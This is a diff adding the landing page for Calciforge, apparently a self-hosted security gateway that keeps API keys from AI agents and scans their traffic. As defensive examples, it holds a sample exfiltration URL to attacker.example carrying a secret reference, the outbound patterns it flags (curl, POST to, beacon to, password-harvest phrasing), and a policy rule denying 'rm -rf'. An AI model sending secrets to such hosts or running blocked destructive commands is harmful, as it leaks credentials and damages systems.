@@ -1,0 +1,508 @@
+---
+layout: default
+title: Calciforge
+---
+
+<style>
+:root {
+  --calci-fire: #d97706;
+  --calci-fire-bright: #f59e0b;
+  --calci-stone: #44403c;
+  --calci-stone-soft: #78716c;
+  --calci-paper: #fafaf9;
+  --calci-ink: #1c1917;
+  --calci-line: #e7e5e4;
+  --calci-code-bg: #f5f5f4;
+  --calci-code-dark: #1c1917;
+}
+html { box-sizing: border-box; }
+*, *:before, *:after { box-sizing: inherit; }
+body {
+  background: var(--calci-paper);
+  color: var(--calci-ink);
+  font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
+  line-height: 1.6;
+  margin: 0;
+  max-width: none;
+  min-height: 100vh;
+  padding: 0;
+}
+.container { max-width: 760px; margin: 2.5rem auto; padding: 0 1.2rem 4rem; }
+.hero {
+  min-height: min(720px, 78vh);
+  display: grid;
+  align-items: end;
+  background-image: url("assets/calciforge-hero.jpg");
+  background-size: cover;
+  background-position: center right;
+  color: #1c1917;
+  position: relative;
+}
+.hero::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(
+    90deg,
+    rgba(250, 250, 249, 0.94) 0%,
+    rgba(250, 250, 249, 0.86) 31%,
+    rgba(250, 250, 249, 0.36) 54%,
+    rgba(250, 250, 249, 0.02) 76%
+  );
+}
+.hero-inner {
+  width: min(1160px, calc(100% - 2.4rem));
+  margin: 0 auto;
+  padding: 5rem 0 4.5rem;
+  position: relative;
+  z-index: 1;
+}
+.hero-copy {
+  max-width: 40rem;
+}
+.wordmark {
+  font-size: clamp(3.2rem, 11vw, 7rem);
+  font-weight: 700;
+  letter-spacing: 0;
+  margin: 0;
+  color: #1c1917;
+  line-height: 1;
+  text-shadow: 0 2px 20px rgba(250, 250, 249, 0.65);
+}
+.wordmark .glow {
+  background: linear-gradient(180deg, var(--calci-fire-bright), var(--calci-fire));
+  background-clip: text;
+  -webkit-background-clip: text;
+  color: transparent;
+}
+.tagline {
+  font-style: italic;
+  font-size: clamp(1.15rem, 3vw, 1.7rem);
+  color: #7c2d12;
+  margin: 0.3rem 0 1.5rem;
+  text-shadow: 0 1px 14px rgba(250, 250, 249, 0.75);
+}
+.lede {
+  font-size: 1.05rem;
+  color: var(--calci-ink);
+  margin-bottom: 1.5rem;
+  max-width: 42rem;
+  text-shadow: 0 1px 14px rgba(250, 250, 249, 0.72);
+}
+h2 {
+  font-size: 1.4rem;
+  margin-top: 2.8rem;
+  color: var(--calci-stone);
+  border-bottom: 1px solid var(--calci-line);
+  padding-bottom: 0.4rem;
+}
+h3 { font-size: 1.05rem; margin-top: 1.5rem; color: var(--calci-stone); }
+a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
+a:hover { border-bottom-color: var(--calci-fire); }
+.nav { margin: 1.2rem 0 2rem; padding: 0.6rem 0; border-top: 1px solid var(--calci-line); border-bottom: 1px solid var(--calci-line); font-size: 0.95rem; }
+.nav a { margin-right: 1.4rem; font-weight: 500; }
+.hero .nav {
+  border-color: rgba(68, 64, 60, 0.32);
+  margin-bottom: 0;
+  max-width: 34rem;
+}
+.hero .nav a {
+  color: #7c2d12;
+  text-shadow: 0 1px 10px rgba(250, 250, 249, 0.7);
+}
+ul li { margin-bottom: 0.35rem; }
+code {
+  background: var(--calci-code-bg);
+  padding: 0.1rem 0.35rem;
+  border-radius: 3px;
+  font-size: 0.92em;
+  font-family: ui-monospace, "SF Mono", Menlo, monospace;
+}
+pre {
+  background: var(--calci-code-dark);
+  color: var(--calci-paper);
+  padding: 1rem 1.2rem;
+  border-radius: 6px;
+  overflow-x: auto;
+  font-size: 0.88rem;
+  line-height: 1.5;
+}
+pre code { background: transparent; padding: 0; color: inherit; font-size: inherit; }
+.muted { color: var(--calci-stone-soft); }
+hr { border: 0; border-top: 1px solid var(--calci-line); margin: 2.5rem 0; }
+footer {
+  margin-top: 3.5rem;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--calci-line);
+  font-size: 0.88rem;
+  color: var(--calci-stone-soft);
+}
+footer p { margin: 0.5rem 0; }
+footer .name-origin {
+  background: rgba(217, 119, 6, 0.04);
+  padding: 0.8rem 1rem;
+  border-radius: 4px;
+  border-left: 2px solid rgba(217, 119, 6, 0.4);
+  margin: 1rem 0;
+}
+@media (max-width: 760px) {
+  .hero {
+    min-height: 680px;
+    background-position: 62% center;
+  }
+  .hero::before {
+    background: linear-gradient(
+      180deg,
+      rgba(250, 250, 249, 0.88) 0%,
+      rgba(250, 250, 249, 0.76) 42%,
+      rgba(250, 250, 249, 0.92) 100%
+    );
+  }
+  .hero-inner {
+    padding: 3.5rem 0 3rem;
+  }
+}
+</style>
+
+<header class="hero" aria-label="A warm hand-painted fantasy castle workshop on a dawn hillside">
+<div class="hero-inner">
+<div class="hero-copy">
+
+<h1 class="wordmark">Calci<span class="glow">forge</span></h1>
+<p class="tagline">Keep your castle secure and moving.</p>
+
+<p class="lede">A self-hosted security gateway for AI agents. Every agent
+gets a bound contract — destination-scoped secret substitution,
+model routes, command permissions, and audit trails — without sharing
+raw API keys or trusting the agent's own restraint.</p>
+
+<div class="nav">
+<a href="https://github.com/bglusman/calciforge">GitHub</a>
+<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
+<a href="https://github.com/bglusman/calciforge/tree/main/docs">Docs</a>
+</div>
+
+</div>
+</div>
+</header>
+
+<main class="container" markdown="1">
+
+## What it gives you
+
+Calciforge sits between your AI agents and the rest of the world. The
+gateway covers seven overlapping concerns; you can adopt any subset.
+
+### Secret management
+
+Your agent never holds the actual API key. The gateway resolves
+through [fnox](https://github.com/jdx/fnox) and substitutes at the
+request boundary.
+
+```toml
+# fnox.toml — the secret store the gateway resolves through
+[secrets]
+OPENAI_API_KEY = { encrypted = "age-encryption.org/v1..." }
+ANTHROPIC_API_KEY = { provider = "1password", key = "claude" }
+NPM_TOKEN = { default = "value-from-env-or-prompt" }
+```
+
+For new values, prefer the local paste UI. It gives you a short-lived
+browser form and keeps the value out of Telegram, Matrix, WhatsApp,
+and other chat history:
+
+```bash
+paste-server OPENAI_API_KEY "OpenAI API key"
+# prints http://127.0.0.1:PORT/paste/<token>
+
+paste-server --bulk env-import "bulk .env import"
+# prints http://127.0.0.1:PORT/bulk/<token>
+```
+
+The URLs expire after five minutes and are single-use. The bulk URL
+accepts a whole `.env`-shaped paste and returns per-key results
+(stored / already-exists / illegal-name / malformed).
+
+### Outbound traffic gating
+
+The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
+references at the moment of forwarding — and only if the destination
+is on the per-secret allowlist.
+
+```toml
+# /etc/calciforge/security-proxy.toml
+[secret_destination_allowlist]
+OPENAI_API_KEY = ["api.openai.com", "*.openai.com"]
+ANTHROPIC_API_KEY = ["api.anthropic.com"]
+GITHUB_TOKEN = ["api.github.com", "uploads.github.com"]
+```
+
+Without an allowlist entry: substitution is allowed everywhere
+(opt-in tightening). With an entry: anything else returns 403 before
+the resolver is even consulted, so a prompt-injected agent calling
+`https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
+fails before the secret value is loaded into memory.
+
+Outbound bodies are also scanned for *exfiltration-attempt* patterns
+(`POST to https://…`, `send to https://…`, `curl … https://…`,
+`beacon to`, etc.) and PII-harvest phrasing (`send me your password`,
+`what is your api key`). Generic high-entropy secret-shape detection
+(JWT-shaped strings, `sk-*` keys, etc.) was deliberately removed
+during the channel-integration cut and is on the
+[roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/outbound-sensitive-data-detection.md).
+
+### Inbound traffic gating and tool policy
+
+Every upstream response is scanned for prompt-injection payloads
+before being returned to the agent. Configurable verdicts (Block /
+Review / Allow) routed via the policy plane.
+
+For tool calls, Calciforge adapts the
+[clash](https://crates.io/crates/clash) policy engine through a small
+HTTP daemon shipped in this repo as
+[`clashd`](https://github.com/bglusman/calciforge/tree/main/crates/clashd).
+The daemon is not the product; it is the policy sidecar that lets
+agent runtimes ask "allow, deny, or review?" before a tool executes.
+
+```python
+# clash-policy.star — Starlark policy served by clashd
+def evaluate(ctx):
+    if ctx.tool == "Bash" and "rm -rf" in ctx.args.get("command", ""):
+        return Verdict.deny("destructive command requires manual approval")
+    if ctx.identity != "owner" and ctx.tool == "Write":
+        return Verdict.review("non-owner write — flag for review")
+    return Verdict.allow()
+```
+
+### Model gateway
+
+Calciforge can expose an OpenAI-compatible local endpoint while routing
+requests to named providers, explicit model routes, local models, and
+synthetic models. Chat users can also inspect and switch configured
+aliases with `!model`.
+
+The synthetic-model vocabulary is:
+
+- **Alloy** — blend among interchangeable models by weighted or
+  round-robin selection. Implemented today with context-window
+  validation: every constituent declares a context window, and the
+  alloy can only advertise a ceiling every constituent can satisfy.
+- **Cascade** — ordered fallback on provider failure. The behavior
+  exists inside alloy execution and as named `[[cascades]]`.
+- **Dispatcher** — choose by request shape, such as "smallest
+  sufficient model." This is the size-routing primitive for mixing
+  small local models with larger remote models.
+
+```toml
+# /etc/calciforge/config.toml — model gateway
+
+[proxy]
+enabled = true
+bind = "127.0.0.1:8080"
+backend_type = "http"
+backend_url = "https://api.openai.com/v1"
+backend_api_key_file = "/etc/calciforge/secrets/openai-key"
+
+[proxy.token_estimator]
+strategy = "auto"
+# tokenizer = "o200k_base" # force a tiktoken base for non-OpenAI model IDs
+safety_margin = 1.10
+
+# Pattern-based provider routing — first match wins after model_routes.
+[[proxy.providers]]
+id = "anthropic"
+url = "https://api.anthropic.com/v1"
+api_key_file = "/etc/calciforge/secrets/anthropic-key"
+models = ["claude-*", "anthropic/*"]
+timeout_seconds = 120
+
+[[proxy.providers]]
+id = "local-mlx"
+url = "http://127.0.0.1:8888/v1"
+models = ["local/*", "qwen/*", "mlx/*"]
+
+# Explicit routes take precedence over provider pattern lists.
+[[proxy.model_routes]]
+pattern = "coding/default"
+provider = "anthropic"
+
+# Chat aliases shown by `!model`; `!model sonnet` prints the expansion.
+[[model_shortcuts]]
+alias = "sonnet"
+model = "anthropic/claude-sonnet-4.6"
+
+[[model_shortcuts]]
+alias = "local"
+model = "local/qwen3-35b"
+
+# Alloys pick among equivalent models by weighted or round-robin strategy.
+[[alloys]]
+id = "balanced"
+name = "Balanced remote blend"
+strategy = "weighted"
+
+[[alloys.constituents]]
+model = "anthropic/claude-sonnet-4.6"
+weight = 70
+context_window = 200000
+
+[[alloys.constituents]]
+model = "openrouter/google/gemini-flash-1.5"
+weight = 30
+context_window = 100000
+
+[local_models]
+enabled = true
+current = "qwen3-35b"
+
+[local_models.mlx_lm]
+host = "127.0.0.1"
+port = 8888
+
+[[local_models.models]]
+id = "qwen3-35b"
+hf_id = "mlx-community/Qwen2.5-35B-Instruct-8bit"
+display_name = "Qwen 35B local"
+
+[[dispatchers]]
+id = "smart-local"
+name = "Use local until the prompt outgrows it"
+
+[[dispatchers.models]]
+model = "local/qwen3-35b"
+context_window = 32768
+
+[[dispatchers.models]]
+model = "anthropic/claude-sonnet-4.6"
+context_window = 200000
+```
+
+The full gateway reference is
+[`docs/model-gateway.md`](https://github.com/bglusman/calciforge/blob/main/docs/model-gateway.md).
+Named cascades, dispatchers, and token-window fit checks are captured
+in
+[`docs/rfcs/model-gateway-primitives.md`](https://github.com/bglusman/calciforge/blob/main/docs/rfcs/model-gateway-primitives.md).
+
+### Agent-facing tools (MCP and CLI)
+
+A built-in MCP server and small CLI expose secret *names* to agents
+but never return values — the only way for an agent to use a secret is to
+emit `{% raw %}{{secret:NAME}}{% endraw %}` and let the gateway resolve
+on the way out. Designed so a compromised agent can enumerate names
+and fail to retrieve values.
+
+Today, discovery is process-scoped: it sees the fnox names available
+to the MCP server or CLI process. Calciforge enforces per-secret
+destination allowlists at substitution time, but does not yet enforce
+per-agent secret discovery/use ACLs. That policy layer is on the
+[roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/agent-secret-access-policy.md).
+
+```json
+// ~/.claude/mcp-config.json
+{
+  "mcpServers": {
+    "calciforge-secrets": {
+      "command": "/usr/local/bin/mcp-server",
+      "transport": "stdio"
+    }
+  }
+}
+```
+
+```bash
+calciforge-secrets list
+calciforge-secrets ref BRAVE_API_KEY
+```
+
+### Multi-channel chat
+
+Today: Telegram, Matrix, WhatsApp, Signal. Optional voice forwarding
+on channels that support it.
+
+```toml
+# /etc/calciforge/config.toml — channel configuration
+[[channels]]
+kind = "telegram"
+enabled = true
+bot_token_file = "/etc/calciforge/secrets/telegram-bot-token"
+allowed_users = ["7000000001", "7000000002"]
+
+[[channels]]
+kind = "matrix"
+enabled = true
+homeserver = "https://matrix.example.com"
+access_token_file = "/etc/calciforge/secrets/matrix-access-token"
+room_id = "!roomid:example.com"
+allowed_users = ["@alice:example.com"]
+
+[[channels]]
+kind = "whatsapp"
+enabled = true
+nzc_endpoint = "http://127.0.0.1:18789"
+nzc_auth_token = "{% raw %}{{secret:OPENCLAW_HOOK_TOKEN}}{% endraw %}"
+allowed_numbers = ["+15555550100"]
+```
+
+Per-identity routing: each user gets their own active agent and audit
+trail. Per-agent secret ACLs are planned; current secret enforcement
+is value hiding plus destination allowlists.
+
+### Sensitive system operations
+
+A separate authenticated daemon (`host-agent`) handles ZFS / systemd
+/ PCT / git / exec calls behind mTLS. Agents never get a shell
+directly; they call the daemon, which validates the operation
+shape against allowlist rules and runs through narrow sudoers
+wrappers.
+
+---
+
+## Quick install (Mac)
+
+```bash
+git clone https://github.com/bglusman/calciforge
+cd calciforge
+brew install fnox && fnox init
+bash scripts/install.sh
+```
+
+Three services land as launchd agents:
+- `clashd` on `:9001` — a `clash`-backed policy sidecar
+- `security-proxy` on `:8888` — substitution + scanning + injection
+- `calciforge` — channel router (needs onboarding for an LLM provider)
+
+Route Claude Code through the gateway:
+
+```bash
+# ~/.zshrc
+export HTTPS_PROXY=http://localhost:8888
+```
+
+---
+
+## Status
+
+Solo-operator mature, multi-user team mode in progress. Mac-tested,
+Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
+headless deployment).
+
+The list of what works today and what's still in flight lives in the
+[README's status table](https://github.com/bglusman/calciforge/blob/main/README.md#what-works-today).
+Internal reviews and planning notes live under
+[`research/`](https://github.com/bglusman/calciforge/tree/main/research);
+public roadmap ideas live in
+[`docs/roadmap/`](https://github.com/bglusman/calciforge/tree/main/docs/roadmap).
+
+<footer>
+<div class="name-origin">
+<strong>About the name.</strong> Calciforge is roughly "Calcifer's forge".
+Calcifer is the fire demon from Diana Wynne Jones's
+<em>Howl's Moving Castle</em> who's bound by contract to power the castle's
+magical front door — one door connecting to many places, with strict
+rules about who can pass and where. The metaphor felt apt; the tool
+itself doesn't require any familiarity with the book or its film
+adaptation, and nothing else from either is referenced or used.
+</div>
+<p>MIT-licensed. Some bundled tools (e.g. fnox) carry their own licenses.</p>
+</footer>
+</main>
